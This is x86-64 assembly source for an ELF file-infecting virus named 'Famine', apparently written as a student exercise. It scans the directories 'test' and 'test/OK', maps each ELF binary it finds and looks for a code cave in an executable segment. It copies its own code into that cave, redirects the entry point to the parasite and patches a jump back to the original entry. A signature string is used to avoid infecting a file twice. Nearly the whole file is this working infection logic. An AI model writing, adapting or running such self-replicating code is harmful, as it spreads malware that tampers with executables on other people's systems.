%include "famine.inc"

bits 64
default rel

section .text
global _start

_start:

    ; placing famine on the stack
    mov rbp, rsp
    mov rdi, dir1                                   ; dir to open for arg readDir
    mov rsi, dir1Len
    call _readDir

    ; debug
    writeBack
    mov rsi, tiret
    writeWork
    writeBack
    writeBack

    mov rdi, dir2
    mov rsi, dir2Len
    call _readDir
	_final_jmp:
    jmp _exit

; take directory to open in rdi && size of pwd on rsi
_readDir:
    push rbp
    mov rbp, rsp
    sub rsp, famine_size
    lea r8, FAM(famine.pwdPtr)
    mov [r8], rdi
    lea r8, FAM(famine.lenghtPwd)
    mov [r8], rsi
    mov rax, SYS_OPEN 
    mov rsi, O_RDONLY | O_DIRECTORY
    xor rdx, rdx
    syscall
    cmp rax, 0
    jl _exit
    lea rdi, FAM(famine.fd)                         ; enregistre le fd dans la struct
    mov [rdi], rax

    _getDents:
        lea r10, FAM(famine.fd)
        mov rdi, [r10]
        lea r9, FAM(famine.total_read)              ; init total_read
        mov DWORD[r9], 0
        mov rax, SYS_GETDENTS                   	; getdents64(int fd, void *buf, size_t size_buf)
        lea rsi, FAM(famine.dirents)
        mov rdx, PAGE_SIZE
        syscall
        cmp rax, 0
        jle _returnReadir

        lea r10, FAM(famine.dirents_struct_ptr) 	; r10 -> (struct famine.diretents_struct_ptr)
        mov [r10], rsi          	                ; famine.dirents_struct_ptr -> famine.dirents
        lea r11, FAM(famine.total_to_read)      	; r11 -> (struct famine.total_to_read)
        mov DWORD [r11], eax                        ; famine.total_to_read = getdents total length

    _listFile:
        lea r8, FAM(famine.total_read)      		; r8 -> total lu de getdents
        lea r9, FAM(famine.total_to_read)       	; r9 -> total a lire de getdents
        mov r10, FAM(famine.dirents_struct_ptr) 	; r10 -> actual dirent struct
        lea r11, FAM(famine.dirents_struct_ptr) 	; r11 -> ptr de la struct actuelle
        movzx r12, WORD [r10 + D_RECLEN_OFF] 		; r12 = length de la stuct dirents actuelle
        add [r8], r12d                        		; update du total lu dans r8
        add [r11], r12                          	; famine.diretns_struct_ptr -> sur la prochaine struct
        cmp BYTE [r10 + D_TYPE], D_REG_FILE 		; verifie le type du fichier
        jne _checkRead

        _updatePath:
            lea rsi, [r10 + D_NAME]                 	; charge le nom du fichier dans rsi
            mov byte [rsi - 1], '/'
            sub rsi, FAM(famine.lenghtPwd)
            mov rdi, FAM(famine.pwdPtr)
            call _strcpy

            ;debug
            writeWork
            writeBack
            
            ;met ta fonction ici
			_bf_chk_file:
			call _check_file

        _checkRead:
            mov r8, FAM(famine.total_read)
            mov r12, FAM(famine.total_to_read)
            cmp r8d, r12d                 		; if (total lu >= total getdents)
            jge _getDents
            jmp _listFile

_check_file:
	push rbp
	mov	rbp, rsp
	sub rsp, infection_size

	_open_file:
		mov	rax, SYS_OPEN
		mov rdi, rsi
		mov rsi, O_RDWR
		xor rdx, rdx 
		syscall
		cmp	rax, 0x0
		jl	_leave_return
		mov INF(infection.file_fd), rax

	; === get file size ===
	_get_filesz:
		mov rax, SYS_LSEEK
		mov	rdi, INF(infection.file_fd)
		mov	rsi, 0x0
		mov rdx, SEEK_END
		syscall
		cmp rax, 0x0
		jle _close_file

	_map_file:
	; rax	-> map
		mov rsi, rax								; rsi = file_size
		mov rax, SYS_MMAP
		mov	rdi, 0x0
		mov rdx, PROT_READ | PROT_WRITE | PROT_EXEC
		mov r10, MAP_SHARED
		mov r8, INF(infection.file_fd)
		mov r9, 0x0
		syscall
		cmp	rax, 0x0								; rax -> map (used later)
		jl _leave_return

	_check_format:
		cmp	dword [rax + 1], 0x02464c45				; if != 'ELF64'
		jne _leave_return

	_find_text_seg:
	;*rax	-> map
	;*r14	-> header table
		mov r14, rax								; r14 -> elf start addr
		add r14, [r14 + elf64_ehdr.e_phoff]			; r14 -> start of segment headers's table
		movzx r15, word [rax + elf64_ehdr.e_phnum]	; r15 = number of segments (see _segment_loop)
		xor rcx, rcx								; loop counter
	
	_segment_loop:		; while (cx != r15){check segment p_type & p_flags & cave_size; rcx++ & phdr++}
	;*r14	-> segment header
	; r15	== segment number
	; rcx	-> segment index counter
		cmp r15w, cx
		je	_leave_return
		bt word [r14], 0							; segment is loadable (bit test r14's first bit)
		jnc _continue
		bt qword [r14], 0x20						; segment is executable (bit test r14's 33rd bit)
		jc _check_cave_size
		_continue:
		inc rcx
		add r14, elf64_phdr_size					; r14 -> next_phdr(.p_type) (needed later)
		jmp _segment_loop

		_check_cave_size:
			mov r13, r14
			add r13, elf64_phdr_size + elf64_phdr.p_offset		; r13 -> next_phdr.offset
			mov rbx, [r14 + elf64_phdr.p_offset]	; rbx = curr_phdr.offset
			add rbx, [r14 + elf64_phdr.p_filesz]
			add rbx, CODE_LEN						; rbx = offset end of futur parasite
			cmp [r13], rbx							; if (next_phdr.offset <= offset_end_parasite)
			jle	_segment_loop

	; === found text segment ===
	_valid_seg_found:
	; r13	-> signature
	;*r14	-> segment header
	; r15	-> potential signature
	; === check if infected (read signature) ===
		mov r15, r14								; r15 -> curr_phdr
		add r15, [r14 + elf64_phdr.p_filesz]		; r15 -> end curr_seg
		add r15, CODE_LEN
		sub r15, _end - signature					; r15 -> start of potential signature
		lea r13, signature
		mov r13, [r13]								; r13 = signature[8]
		cmp r13, qword [r15]						; strncmp(signature, (char *)r15, 8);
		je	_leave_return
		
_infection:
;*rax	-> map
; r11	== entrypoint offset 
; r12	-> ehdr.e_entry
; r13	== original entrypoint offset
;*r14	-> segment header
; r15	-> segment end
	mov r15, rax							; r15 -> start of map
	add r15, [r14 + elf64_phdr.p_offset]	; r15 -> start of segment
	add r15, [r14 + elf64_phdr.p_filesz]	; r15 -> end of the segment
	; === stock original entrypoint === 
	mov r12, rax
	add r12, elf64_ehdr.e_entry 			; r12 -> ehdr.e_entry
	mov r13, [r12]							; r13 = original entry offset (we save r12 for later)
	; === update entrypoint to parasite offset ===
	_update_entrypoint:
	; r11	== injection offset
	;*r12	-> ehdr.e_entry
	;*r15	-> segment end
	; ehdr->e_entry = (Elf64_Addr)(cave_segment->p_vaddr + cave_segment->p_memsz);
		mov r11, r15							; r11 -> end of curr_segment
		sub r11, rax 							; r11 = injection offset
		mov [r12], r11							; ehdr.e_entry = injection offset
	; === update segment hdr ===
	_update_seg_hdr:
	; r12	-> phdr.filesz
	;*r14	-> segment header
	mov r12, r14
	add r12, elf64_phdr.p_filesz
	add	qword [r12], qword CODE_LEN
	add r14, elf64_phdr.p_memsz
	add qword [r14], qword CODE_LEN
	; === copy parasite ===
	_copy_parasite:
	;*r15	-> segment_end
		mov rdi, r15							; rdi -> end of curr_seg(start of injection)
		lea rsi, [rel _start]					; rsi -> start of our code
		xor rcx, rcx
		mov rcx, CODE_LEN						; counter will decrement
		cld										; copy from _start to _end (= !std)
		rep movsb
	; === update jmp end parasite ===
	_update_parasite_jmp:
	; r10	-> parasite final jmp instruction
	;*r11	== injection offset
	; r12	== distance to jump from parasite last jmp to original entry
	;*r13	== original entry offset
	; r14	-> parsite's _start
	; int32_t	jmp_offset = original_entry - (0x1175 + index_jmp + 5); 
		lea r12, [rel _final_jmp]				; r12 -> _final_jmp
		lea r14, [rel _start]					; r14 -> parasite _start
		sub r12, r14							; r12 == _final_jmp's offset
		add r12, r11 							; r12 == _final_jmp's offset in final binary
		mov r10, rax
		add r10, r12							; 
		add r10, 0x1							; r11 -> just after the jmp instruction
		mov [r10], qword r13					; write the offset to jump to


	jmp _leave_return

; *** pas obligatoire ***
_close_file:
	mov	rax, qword 0x3
	mov	rdi, INF(infection.file_fd)
	syscall
	jmp _leave_return
	jmp _checkRead

_returnReadir:
    mov rax, SYS_CLOSE
    mov rdi, FAM(famine.fd)
    syscall
    leave
    ret

_leave_return:
	leave
	ret

_exit:
    mov rax, 60
    xor rdi, rdi
    syscall

;strcpy(dst:rsi src: rdi) (without /0 at the end)
_strcpy:
	xor rcx, rcx
	strcpy_loop:
		cmp byte [rdi + rcx], 0
		je	strcpy_loop_end
		mov al, byte [rdi + rcx]
		mov [rsi + rcx], al
		add rcx, 1
		jmp strcpy_loop

	strcpy_loop_end:
		; mov byte [rsi + rcx], 0
		ret

; debug
; strlen(str:rsi)
_strlen:
	xor rcx, rcx
	
	ft_strlen_loop:
		cmp	byte [rsi + rcx], 0
		je	ft_strlen_end
		inc rcx
		jmp	ft_strlen_loop

	ft_strlen_end:
		mov rax, rcx
		ret

dir1        db  "test", 0
dir1Len    equ $ - dir1
dir2        db  "test/OK", 0
dir2Len    equ $ - dir2
signature	db	"Famine version 1.0 (c)oded by anvincen-eedy", 0x0

;debug
tiret       db  "..---..",0
back        db  10, 0
_end: